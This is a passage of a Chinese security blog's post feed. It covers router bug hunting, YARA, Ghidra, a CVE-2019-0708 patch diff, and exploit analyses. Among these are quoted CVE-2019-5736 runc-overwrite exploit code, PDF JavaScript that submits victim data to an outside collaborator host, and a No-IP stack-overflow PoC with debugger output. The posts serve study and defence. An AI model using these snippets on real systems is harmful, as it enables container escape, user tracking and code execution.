就得到vm_escape.tar.gz，再解压就可以了 Referencehttp://phrack.org/papers/vm-escape-qemu-case-study.html","categories":[],"tags":[{"name":"qemu","slug":"qemu","permalink":"https://www.giantbranch.cn/tags/qemu/"},{"name":"vm escape","slug":"vm-escape","permalink":"https://www.giantbranch.cn/tags/vm-escape/"},{"name":"虚拟机逃逸","slug":"虚拟机逃逸","permalink":"https://www.giantbranch.cn/tags/虚拟机逃逸/"}]},{"title":"路由器0day漏洞挖掘实战","slug":"路由器0day漏洞挖掘实战","date":"2019-06-20T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2019/06/20/路由器0day漏洞挖掘实战/","link":"","permalink":"https://www.giantbranch.cn/2019/06/20/路由器0day漏洞挖掘实战/","excerpt":"","text":"本文已发表到安全客：https://www.anquanke.com/post/id/180714 这个题目，2018年的7月6日的时候在公司内部分享过了，说来也将近一年了，懒得现在才发出来。 在2018年的3，4月两个多三个月的时间里，花了比较多的时间去搞一个国产的路由器，挖了一些漏洞后，之后也就没搞了。 也写了个有一点作用的MIPS IDAPYTHON审计辅助脚本 https://github.com/giantbranch/mipsAudit 基础知识简介 1、路由器基本都是阉割版的linux系统2、架构以MIPS和ARM为主3、一般含有telnet服务4、很多基础命令以busybox的方式实现（如cat，chmod，date，echo，ifconfig，ls，kill等） 比如下面路由器中的busybox 路由器常见漏洞 Web漏洞 XSS CSRF 二进制漏洞 主要是栈溢出 自带后门 磊科路由器后门：私有协议，硬编码密码的后门 环境及工具 Ubuntu虚拟机pythonIDABinwalkQEMU对应架构的qemu虚拟机gdb及静态编译的gdbserverBurp，filefox插件。。。。。。 固件的提取与解压总览 固件提取1、对智能硬件（路由器）的升级进行抓包，提取url2、通过烧录器读取拆卸下来的芯片 3、通过mtd的方式 查看分区信息 一般别人用dd命令来提取，其实用cp和cat也可以 4、通过串口的方式假如串口可以获得shell，那么可以使用第三种方法 固件解压binwalk -Me XXXXXX.binM ，–matryoshka 递归扫描可解压的e，–extract 提取解压到的是_XXXXXX.bin.extracted/ 以某个路由器为例的漏洞挖掘Web安全漏洞审计web源码，发现有些目录（下面的goform）不存在，代码在二进制中实现，故使用黑盒测试 随便试了一下搞了几个XSS 还有自带命令执行的 添加路由处存在命令注入漏洞，这个是找到溢出后顺便发现的 二进制漏洞挖掘之静态分析这个我编写了个IDAPYTHON审计辅助脚本，用处嘛，有一点点吧。。。 开源地址：https://github.com/giantbranch/mipsAudit 辅助脚本功能如下：1、找到危险函数的调用处，并且高亮该行（也可以下断点）2、给参数赋值处加上注释3、最后以表格的形式输出函数名，调用地址，参数，还有当前函数的缓冲区大小 详细见下图 针对不确定参数的函数 我们可以点击addr那一列直接到达函数调用处，方便审计 其实跑出来的量还是很大的，我只不过是偶然的机会遇到了刚好又漏洞的。。 我定位到的是下面这里，有strcat和sprintf 向上回溯有个route add的字符串 那应该是添加路由的地方 测试 发现后面goahead的pid都变了，那应该溢出崩溃，重启了 上gdb调试确认溢出 那么漏洞成因就是：strcat和sprintf的拼接 动态调试1、基于qemu2、在设备上调试 qemuqemu有两种运作模式用户模式（User mode），启动不同架构的Linux程序系统模式（System mode），模拟整个电脑系统（这个暂时还没能够实现动态调试） 注：有些程序比较依赖于特定的函数（比如nvram系列函数）就很难用qemu启动了 将对应的qemu程序及其依赖库拷贝到对应目录，使用静态的就没这烦恼了 启动一个mipsel的程序 1sudo chroot ./ ./qemu-mipsel ./bin/busybox 调试只要加-g参数即可（下面会监听23946端口）sudo chroot ./ ./qemu-mipsel -g 23946 ./bin/busyboxida 使用remote gdb debuger即可 在设备上调试条件1、有shell权限2、有静态编译的gdbserver或者gdb Reference《揭秘家用路由器0day漏洞挖掘技术》《IDA Pro权威指南》《python 灰帽子》https://github.com/wangzery/SearchOverflow/blob/master/SearchOverflow.pyhttps://www.hex-rays.com/products/ida/support/idapython_docs/","categories":[],"tags":[{"name":"路由器漏洞挖掘","slug":"路由器漏洞挖掘","permalink":"https://www.giantbranch.cn/tags/路由器漏洞挖掘/"}]},{"title":"CVE-2019-5736 docker escape 简要分析","slug":"CVE-2019-5736 docker escape 简要分析","date":"2019-06-19T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2019/06/19/CVE-2019-5736 docker escape 简要分析/","link":"","permalink":"https://www.giantbranch.cn/2019/06/19/CVE-2019-5736 docker escape 简要分析/","excerpt":"","text":"闲来没事，简单分析分析，理解理解 分析exp首先这个跟runc有关 RunC 是一个轻量级的工具，它是用来运行容器的，只用来做这一件事，并且这一件事要做好。我们可以认为它就是个命令行小工具，可以不用通过 docker 引擎，直接运行容器。 exp：https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go 步骤1：首先替换了/bin/sh为#!/proc/self/exe，这样的话，当某个程序调用/bin/sh的时候，就会调用自身 12345678910111213// First we overwrite /bin/sh with the /proc/self/exe interpreter pathfd, err := os.Create(&quot;/bin/sh&quot;)if err != nil &#123; fmt.Println(err) return&#125;fmt.Fprintln(fd, &quot;#!/proc/self/exe&quot;)err = fd.Close()if err != nil &#123; fmt.Println(err) return&#125;fmt.Println(&quot;[+] Overwritten /bin/sh successfully&quot;) 我们可以用ll看看，是不是指向ls 12root@b7652e3a006b:~# ll /proc/self/exelrwxrwxrwx 1 root root 0 Jun 19 15:30 /proc/self/exe -&gt; /bin/ls* 步骤2：寻找runc的pid 12345678910111213141516171819202122// Loop through all processes to find one whose cmdline includes runcinit// This will be the process created by runcvar found intfor found == 0 &#123; pids, err := ioutil.ReadDir(&quot;/proc&quot;) if err != nil &#123; fmt.Println(err) return &#125; for _, f := range pids &#123; fbytes, _ := ioutil.ReadFile(&quot;/proc/&quot; + f.Name() + &quot;/cmdline&quot;) fstring := string(fbytes) if strings.Contains(fstring, &quot;runc&quot;) &#123; fmt.Println(&quot;[+] Found the PID:&quot;, f.Name()) found, err = strconv.Atoi(f.Name()) if err != nil &#123; fmt.Println(err) return &#125; &#125; &#125;&#125; 步骤3：往找到的runc的文件句柄写我们要执行的命令什么的 123456789101112131415161718192021// We will use the pid to get a file handle for runc on the host. var handleFd = -1 for handleFd == -1 &#123; // Note, you do not need to use the O_PATH flag for the exploit to work. handle, _ := os.OpenFile(&quot;/proc/&quot;+strconv.Itoa(found)+&quot;/exe&quot;, os.O_RDONLY, 0777) if int(handle.Fd()) &gt; 0 &#123; handleFd = int(handle.Fd()) &#125; &#125; fmt.Println(&quot;[+] Successfully got the file handle&quot;) // Now that we have the file handle, lets write to the runc binary and overwrite it // It will maintain it&apos;s executable flag for &#123; writeHandle, _ := os.OpenFile(&quot;/proc/self/fd/&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) &gt; 0 &#123; fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle) writeHandle.Write([]byte(payload)) return &#125; &#125; 找pid的目的是找到runc的路径，比如下面可以通过 /proc/pid/exe获得/bin/bash的软连接，只不过上面是获取runc的软连接 123456root@b7652e3a006b:~# ps -aux | grep bashroot 1 0.0 0.1 18508 3160 pts/0 Ss+ 15:11 0:00 /bin/bashroot 10 0.0 0.1 18824 3836 pts/1 Ss 15:18 0:00 /bin/bashroot 46 0.0 0.0 11464 1040 pts/1 S+ 15:33 0:00 grep --color=auto bashroot@b7652e3a006b:~# ll /proc/10/exe lrwxrwxrwx 1 root root 0 Jun 19 15:18 /proc/10/exe -&gt; /bin/bash* 步骤4：当用户调用docker exec的时候，相当于runc 调用/bin/sh,而/bin/sh被我们改为#!/proc/self/exe，即runc运行自身，而runc自身也被我们修改了，所以相当于runc执行了我们的代码 Referencehttps://thinkycx.me/posts/2019-05-23-CVE-2019-5736-docker-escape-recurrence.htmlhttps://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go","categories":[],"tags":[{"name":"docker安全","slug":"docker安全","permalink":"https://www.giantbranch.cn/tags/docker安全/"},{"name":"docker escape","slug":"docker-escape","permalink":"https://www.giantbranch.cn/tags/docker-escape/"}]},{"title":"yara的安装与使用","slug":"yara的安装与使用","date":"2019-05-24T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2019/05/24/yara的安装与使用/","link":"","permalink":"https://www.giantbranch.cn/2019/05/24/yara的安装与使用/","excerpt":"","text":"yara可以说是正则匹配的工具吧，一般用于病毒的静态检测 下载这里直接下载windows的 https://github.com/VirusTotal/yara/releases 也可以从这下 https://www.dropbox.com/sh/umip8ndplytwzj1/AADdLRsrpJL1CM1vPVAxc5JZa?dl=0&amp;lst= Ubuntu 懒得编译可以直接apt安装 1sudo apt install yara 用官方最简单的示例测试是否可用1234// 最简单的规则echo &quot;rule dummy &#123; condition: true &#125;&quot; &gt; my_first_rule// 用规则测试规则yara my_first_rule my_first_rule 获取yara规则有开源的：https://github.com/Yara-Rules/rules 规则分11大类： Antidebug_AntiVM：反调试/反沙箱类yara规则 Crypto：加密类yara规则 CVE_Rules：CVE漏洞利用类yara规则 email：恶意邮件类yara规则 Exploit-Kits：EK类yara规则 Malicious_Documents：恶意文档类yara规则 malware：恶意软件类yara规则 Mobile_Malware：移动恶意软件类yara规则 Packers：加壳类yara规则 utils：通用类yara规则 Webshells：Webshell类yara规则 获取样本测试https://github.com/ytisf/theZoo/tree/master/malwares/Binaries 我们随便下载一个，比如WannaCry的 https://github.com/ytisf/theZoo/tree/master/malwares/Binaries/Ransomware.WannaCry 我们看看他用了什么加密算法，可以看到使用了CRC32，以及AES算法 1234567891011121314giantbranch@ubuntu:~/yara/Ransomware.WannaCry$ yara ../rules/Crypto_index.yar ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exe../rules/./Crypto/crypto_signatures.yar(12): warning: $c0 is slowing down scanning (critical!)../rules/./Crypto/crypto_signatures.yar(24): warning: $c0 is slowing down scanning (critical!)../rules/./Crypto/crypto_signatures.yar(36): warning: $c0 is slowing down scanning (critical!)../rules/./Crypto/crypto_signatures.yar(48): warning: $c0 is slowing down scanning (critical!)../rules/./Crypto/crypto_signatures.yar(60): warning: $c0 is slowing down scanning (critical!)../rules/./Crypto/crypto_signatures.yar(72): warning: $c0 is slowing down scanning (critical!)../rules/./Crypto/crypto_signatures.yar(93): warning: $c0 is slowing down scanning../rules/./Crypto/crypto_signatures.yar(776): warning: $c0 is slowing down scanningCRC32_poly_Constant ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeCRC32_table ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeRijnDael_AES ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeRijnDael_AES_CHAR ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeRijnDael_AES_LONG ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exe 看看属于哪类恶意样本，判断还是比较准确 1234567891011giantbranch@ubuntu:~/yara/Ransomware.WannaCry$ yara ../rules/malware_index.yar ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exe../rules/./malware/APT_DPRK_ROKRAT.yar(47): warning: $b2 is slowing down scanning../rules/./malware/RAT_Ratdecoders.yar(153): warning: $conf is slowing down scanning (critical!) Str_Win32_Winsock2_Library ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeWannaDecryptor ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeWanna_Sample_84c82835a5d21bbcf75a61706d8ab549 ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeransom_telefonica ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeWanna_Cry_Ransomware_Generic ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeWannaCry_Ransomware ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeWannaCry_Ransomware_Dropper ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exewannacry_static_ransom ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exe 看看加了什么壳 123456789101112131415161718giantbranch@ubuntu:~/yara/Ransomware.WannaCry$ yara ../rules/Packers_index.yar ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exe../rules/./Packers/Javascript_exploit_and_obfuscation.yar(26): warning: $fff is slowing down scanning (critical!)../rules/./Packers/peid.yar(672): warning: $a is slowing down scanning (critical!)../rules/./Packers/peid.yar(900): warning: $a is slowing down scanning。。。。。。。。。。。。。。。。。。。。。。。。../rules/./Packers/peid.yar(68942): warning: $a is slowing down scanning../rules/./Packers/peid.yar(68951): warning: $a is slowing down scanningIsPE32 ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeIsWindowsGUI ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeIsPacked ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeHasRichSignature ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeMicrosoft_Visual_Cpp_v60 ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeMicrosoft_Visual_Cpp_v50v60_MFC_additional ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeMicrosoft_Visual_Cpp_50 ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeMicrosoft_Visual_Cpp_v50v60_MFC ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeMicrosoft_Visual_Cpp ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exe 有没有反调试反虚拟机 12giantbranch@ubuntu:~/yara/Ransomware.WannaCry$ yara ../rules/Antidebug_AntiVM_index.yar ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exeSEH_Init ./ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exe 简单总结通过yara，还有一些开源的规则，我们可以简单快速地静态分析恶意软件 referencehttps://yara.readthedocs.io/en/v3.7.0/gettingstarted.htmlhttps://blog.csdn.net/m0_37552052/article/details/79012453","categories":[],"tags":[{"name":"yara","slug":"yara","permalink":"https://www.giantbranch.cn/tags/yara/"}]},{"title":"CVE-2019-0708 微软远程桌面服务远程代码执行漏洞分析之补丁分析","slug":"CVE-2019-0708 微软远程桌面服务远程代码执行漏洞分析之补丁分析","date":"2019-05-15T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2019/05/15/CVE-2019-0708 微软远程桌面服务远程代码执行漏洞分析之补丁分析/","link":"","permalink":"https://www.giantbranch.cn/2019/05/15/CVE-2019-0708 微软远程桌面服务远程代码执行漏洞分析之补丁分析/","excerpt":"","text":"2019.09.30——更新：本分析最后对于漏洞的判断有误，漏洞是UAF漏洞，所以更新了一篇文章，具体请看： CVE-2019-0708 微软远程桌面服务远程代码执行漏洞之漏洞分析与漏洞利用 声明：分析只是个人观点，可能关注的点并不对，分析的可能有问题 仅供参考 5月14日，微软发了这个漏洞的补丁。 不废话直接补丁对比，看看啥情况，安装完是termdd.sys这个驱动更新了，应该是这个的问题 上神器对比，可以看到改了两处——IcaRebindVirtualChannels和IcaBindVirtualChannels 在点开最后一个看看，加了一个strcmp 看伪代码好看点 可以看到重点应该在MS_T120这个名字的Channel，假如是这个Channel，那么strcmp返回0 最后调用的是_IcaBindChannel(v5, 5, 31, v7); 可以看到这个直接将第3个参数写死了——31 我们跟进函数看看，假如第3的参数可控，那么就能达到越界写的效果，所以微软直接将参数写死为31了 由于对rdp不太熟悉，能力也不足，构造poc这事暂时是干不了，也就写到这了。 而且其实另外一个函数IcaBindVirtualChannels也是这么修改的 声明以上分析只是个人观点，可能关注的点并不对，仅供参考","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://www.giantbranch.cn/tags/漏洞分析/"},{"name":"补丁分析","slug":"补丁分析","permalink":"https://www.giantbranch.cn/tags/补丁分析/"}]},{"title":"美国国安局逆向工程框架——Ghidra的简单使用","slug":"美国国安局逆向工程框架——Ghidra的简单使用","date":"2019-03-06T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2019/03/06/美国国安局逆向工程框架——Ghidra的简单使用/","link":"","permalink":"https://www.giantbranch.cn/2019/03/06/美国国安局逆向工程框架——Ghidra的简单使用/","excerpt":"","text":"背景Ghidra是由NSA开发的软件逆向工程（SRE）框架。 它有助于分析恶意代码和病毒等恶意软件，并可以让网络安全专业人员更好地了解其网络和系统中的潜在漏洞。 美国国家安全局在今年3月举行的2019年RSA会议上首次公开演示时，将Ghidra作为开放源代码发布给公众。 链接： https://ghidra-sre.org/ 国内应该访问不到，怎么访问你懂的~ 前置环境宣称可以在以下三个环境运行（暂时支持64位的系统） Microsoft Windows 7 or 10 (64-bit) Linux (64-bit, CentOS 7 is preferred) macOS (OS X) 10.8.3+ (Mountain Lion or later) 依赖：jdk11 下载地址（我下载的是当时最新的Java SE 11.0.2(LTS)） https://www.oracle.com/technetwork/java/javase/downloads/index.html 使用创建项目windows直接双击ghidraRun.bat打开（linux和mac可以执行ghidraRun脚本） 首先我们创建一个project（上图我是已经新建了一个叫做test的项目） 选择Non-Shared Project （另一个选择Shared Project是会在本地监听一个端口，方便分享） 接下来填好路径和项目名就可以了 反编译程序导入要分析的二进制文件，都选择默认选项就行 之后你导入的二进制文件就会出现在project下面（我的项目名是test） 双击对应的文件即可开始分析该文件，下面以Reverse-org.exe为例，双击后选择分析 然后选择分析选项 那怎么找到main函数呢我们可以找到左边的functions，找到entry（当然有些程序直接有main，或者_start等关键字） 通过Filter搜索可以更快一点，双击即可再右边看到entry代码 查看反编译，对逆向熟悉的就知道下面这个就是main函数了 双击即可跳到面函数处，反编译窗口下拉即可看到main的代码 看函数的流程图可以点这个 最后说说现在想到的一些快捷键 1、g 跳到对应的地址2、f 创建函数3、; 添加注释4、L 重命名变量名，函数名 总结试了下，发现几点1、可以对mips架构的程序进行反编译，这个比ida要好（官方说支持各种处理器指令集，试了下SPARC架构也可以，真牛逼！！！）2、反编译的c++代码好像更加简洁3、支持多平台，这个不错4、更重要的，开源，免费 缺点：不熟悉操作，暂时感觉没有ida方便，没发现有调试功能","categories":[],"tags":[{"name":"逆向工具","slug":"逆向工具","permalink":"https://www.giantbranch.cn/tags/逆向工具/"},{"name":"Ghidra","slug":"Ghidra","permalink":"https://www.giantbranch.cn/tags/Ghidra/"},{"name":"NSA","slug":"NSA","permalink":"https://www.giantbranch.cn/tags/NSA/"}]},{"title":"Chrome浏览器打开PDF文件信息泄露漏洞简析","slug":"Chrome浏览器打开PDF文件信息泄露漏洞简析","date":"2019-03-01T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2019/03/01/Chrome浏览器打开PDF文件信息泄露漏洞简析/","link":"","permalink":"https://www.giantbranch.cn/2019/03/01/Chrome浏览器打开PDF文件信息泄露漏洞简析/","excerpt":"","text":"edgespot在2月26日在他们的博客上报告了这个问题，今天我了看了下，简单记录一下 背景自2018年12月下旬以来，EdgeSpot已经在野外检测到多个PDF样本，这些样本利用谷歌浏览器未修补的漏洞。使用Google Chrome作为本地PDF查看器时，假如成功利用漏洞，可以跟踪用户并收集一些用户信息。 简析我下载了一些样本，查看了下，是在pdf中嵌入了JavaScript，JavaScript有些是没有加密的，有些是zip的压缩算法加密（即FlateDecode），可以使用zlib库解密 原理很简单，就是利用this.submitForm()这个PDF Javascript API，将发送一个POST请求，请求正文包含一个FDF格式的文件，其中里面泄露用户的路径 关键js代码如下（下面贴一个简单的js）： 12345678910119 0 obj&lt;&lt;/S/JavaScript/JS( if\\(this.submitForm\\)&#123; this.submitForm\\(&apos;http://zuxjk0dftoamimorjl9dfhr44vap3fr7ovgi76w.burpcollaborator.net&apos;\\); app.alert\\(&quot;Script executed&quot;\\); &#125;)/Next&lt;&lt;/F&lt;&lt;/F 10 0 R/FS/URL&gt;&gt;/S/SubmitForm&gt;&gt;&gt;&gt;endobj 我将上面的url改为我自己的服务器地址192.168.XXX.XXX，下面是我抓包的结果 那么攻击者可以得到的信息有 1、受害者公网ip2、使用的浏览器的版本3、pdf所在的路径 其他样本所含的js 美化后 总结试了一下，这个不止是chrome浏览器受影响，360浏览器也受影响，那么应该是使用chromium内核的都受影响了。 建议：打开pdf用其他pdf查看器，不建议打开来路不明的pdf，保险一点的可以使用网盘等在线的查看器查看 referencehttps://www.anquanke.com/post/id/172035https://blog.edgespot.io/2019/02/edgespot-detects-pdf-zero-day-samples.html","categories":[],"tags":[{"name":"Chrome","slug":"Chrome","permalink":"https://www.giantbranch.cn/tags/Chrome/"},{"name":"信息泄露","slug":"信息泄露","permalink":"https://www.giantbranch.cn/tags/信息泄露/"}]},{"title":"No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析","slug":"No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析","date":"2019-01-08T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2019/01/08/No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析/","link":"","permalink":"https://www.giantbranch.cn/2019/01/08/No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow 漏洞简析/","excerpt":"","text":"环境 gdb + peda + pwndbgubuntu 16.04 分析poc（exp可以查看底部链接，不过那个exp不好使，因为好像便宜不对，而且返回地址是写死的） 1234567import osbinary = &quot;./noip2-i686&quot;print &quot;[*] Executing %s ...&quot; % (binary)os.system(&quot;%s -i %s&quot; % (binary, &quot;A&quot; * 500)) 直接运行会报错，缺少/usr/local/etc/no-ip2.conf文件，查看文档，可以看到-C可以新建 1234567891011121314151617181920212223242526272829303132333435363738$ ./noip2-i686 -hUSAGE: noip2-i686 [ -C [ -F][ -Y][ -U #min] [ -u username][ -p password][ -x progname]] [ -c file][ -d][ -D pid][ -i addr][ -S][ -M][ -h]Version Linux-2.1.9Options: -C create configuration data -F force NAT off -Y select all hosts/groups -U minutes set update interval -u username use supplied username -p password use supplied password -x executable use supplied executable -c config_file use alternate data path -d increase debug verbosity -D processID toggle debug flag for PID -i IPaddress use supplied address -I interface use supplied interface -S show configuration data -M permit multiple instances -K processID terminate instance PID -z activate shm dump code -h help (this text)$ sudo ./noip2-i686 -CAuto configuration for Linux client of no-ip.com.Please enter the login/email string for no-ip.com XXX@XXX.comPlease enter the password for user &apos;XXX@XXX.com&apos; ***************Only one host [XXXXX.ddns.net] is registered to this account.It will be used.Please enter an update interval:[30] Do you wish to run something at successful update?[N] (y/N) ^MNew configuration file &apos;/usr/local/etc/no-ip2.conf&apos; created.$ sudo chmod 777 /usr/local/etc/no-ip2.conf 通过exploit-db的信息，我们知道漏洞在-i处 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374gdb-peda$ r -i `python -c &quot;print &apos;A&apos;*500&quot;`Starting program: /home/giantbranch/tmp/noip/noip-2.1.9-1/binaries/noip2-i686 -i `python -c &quot;print &apos;A&apos;*500&quot;`IP address detected on command line.Running in single use mode.IP address &apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUse the NAT facility.Program received signal SIGSEGV, Segmentation fault.[----------------------------------registers-----------------------------------]EAX: 0x41414141 (&apos;AAAA&apos;)EBX: 0x0 ECX: 0xffffffff EDX: 0xf7fb8864 --&gt; 0x0 ESI: 0xf7fb7000 --&gt; 0x1b1db0 EDI: 0xf7fb7000 --&gt; 0x1b1db0 EBP: 0x41414141 (&apos;AAAA&apos;)ESP: 0xffffd350 (&apos;A&apos; &lt;repeats 15 times&gt;...)EIP: 0x41414141 (&apos;AAAA&apos;)EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]Invalid $PC address: 0x41414141[------------------------------------stack-------------------------------------]0000| 0xffffd350 (&apos;A&apos; &lt;repeats 15 times&gt;...)0004| 0xffffd354 (&apos;A&apos; &lt;repeats 15 times&gt;...)0008| 0xffffd358 (&apos;A&apos; &lt;repeats 15 times&gt;...)0012| 0xffffd35c (&apos;A&apos; &lt;repeats 15 times&gt;...)0016| 0xffffd360 (&apos;A&apos; &lt;repeats 15 times&gt;...)0020| 0xffffd364 (&apos;A&apos; &lt;repeats 15 times&gt;...)0024| 0xffffd368 (&apos;A&apos; &lt;repeats 15 times&gt;...)0028| 0xffffd36c (&apos;A&apos; &lt;repeats 15 times&gt;...)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGSEGV0x41414141 in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA──────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────── EAX 0x41414141 (&apos;AAAA&apos;) EBX 0x0 ECX 0xffffffff EDX 0xf7fb8864 (_IO_stdfile_2_lock) ◂— 0 EDI 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov al, 0x1d /* 0x1b1db0 */ ESI 0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov al, 0x1d /* 0x1b1db0 */ EBP 0x41414141 (&apos;AAAA&apos;) ESP 0xffffd350 ◂— 0x41414141 (&apos;AAAA&apos;) EIP 0x41414141 (&apos;AAAA&apos;)───────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────Invalid address 0x41414141────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd350 ◂— 0x41414141 (&apos;AAAA&apos;)... ↓──────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────── ► f 0 41414141 f 1 41414141 f 2 41414141 f 3 41414141 f 4 41414141 f 5 41414141 f 6 41414141 f 7 41414141 f 8 41414141 f 9 41414141 f 10 41414141Program received signal SIGSEGV (fault address 0x41414141) 输出的看到最后一行是Use the NAT facility.，我们IDA找一下，是在handle_dynup_error函数里面，发现这里只是输出 1234case 27: Msg(&quot;IP address &apos;%s&apos; is a private network address.&quot;, (unsigned int)&amp;IPaddress); Msg(&quot;Use the NAT facility.&quot;, v2); goto LABEL_26; 但是调用这个的有很多，不好确定是哪个，我们再看上一个字符串Recovering dead process 111467 shmem slot，发现是在get_shm_info函数里面 123456789101112131415161718192021222324252627for ( i = 0; i &lt;= 3; ++i )&#123;v13 = shared + 504 * i;if ( !*(_DWORD *)(shared + 504 * i) )&#123; my_instance = shared + 504 * i; break;&#125;if ( !strcmp((const char *)(v13 + 24), config_filename) )&#123; if ( kill(*(_DWORD *)v13, 0) == -1 &amp;&amp; *__errno_location() == 3 ) &#123; Msg(&quot;Recovering dead process %d shmem slot&quot;, *(_DWORD *)v13); my_instance = v13; break; &#125; if ( background || !IPaddress ) &#123; Msg(&quot;Configuration &apos;%s&apos; already in use&quot;, v13 + 24); Msg(&quot;by process %d. Ending!&quot;, *(_DWORD *)v13); shmdt(shmaddr); shared = 0; return -1; &#125; strncpy((char *)(v13 + 8), &amp;IPaddress, 0x10u);&#125;&#125; 在Msg(&quot;Recovering dead process %d shmem slot&quot;, *(_DWORD *)v13);处下断点，栈数据没有被破坏，所以这还没到漏洞点，这时已经回到main函数了 只剩后面这些代码了，由于IPaddress我们指定了，所以肯定不为0 ，进入的是第二个if，那么下面这些函数没看出什么漏洞，那么漏洞应该在dynamic_update里面 1234567891011121314151617181920212223242526if ( get_shm_info() != -1 )&#123; if ( !IPaddress ) &#123; if ( nat ) get_our_visible_IPaddr(&amp;IPaddress); else getip(&amp;IPaddress, device); &#125; if ( IPaddress ) &#123; if ( dynamic_update() == 1 ) &#123; strncpy((char *)(my_instance + 8), &amp;IPaddress, 0x10u); goto LABEL_31; &#125; *(_DWORD *)my_instance = 0; shmdt(shmaddr); &#125; else &#123; Msg(&quot;Not connected to Net!&quot;, v7); *(_DWORD *)my_instance = 0; shmdt(shmaddr); &#125;&#125; 我们执行到call dynamic_update，ni就蹦了，IDA查看这个函数，很快就可以看到这个漏洞点了 1sprintf(&amp;s, &quot;&amp;ip=%s&quot;, &amp;IPaddress); 我们调试确认一下 1234567891011121314151617 0x804c032 &lt;dynamic_update+79&gt; call bdecode &lt;0x804e989&gt; 0x804c037 &lt;dynamic_update+84&gt; mov dword ptr [esp + 8], IPaddress &lt;0x80573bc&gt; 0x804c03f &lt;dynamic_update+92&gt; mov dword ptr [esp + 4], 0x804fd8d 0x804c047 &lt;dynamic_update+100&gt; lea eax, [ebp - 0x128] 0x804c04d &lt;dynamic_update+106&gt; mov dword ptr [esp], eax► 0x804c050 &lt;dynamic_update+109&gt; call sprintf@plt &lt;0x8049348&gt; s: 0xffffd2e0 —▸ 0xf7fd2018 ◂— 0x7273752f (&apos;/usr&apos;) format: 0x804fd8d ◂— 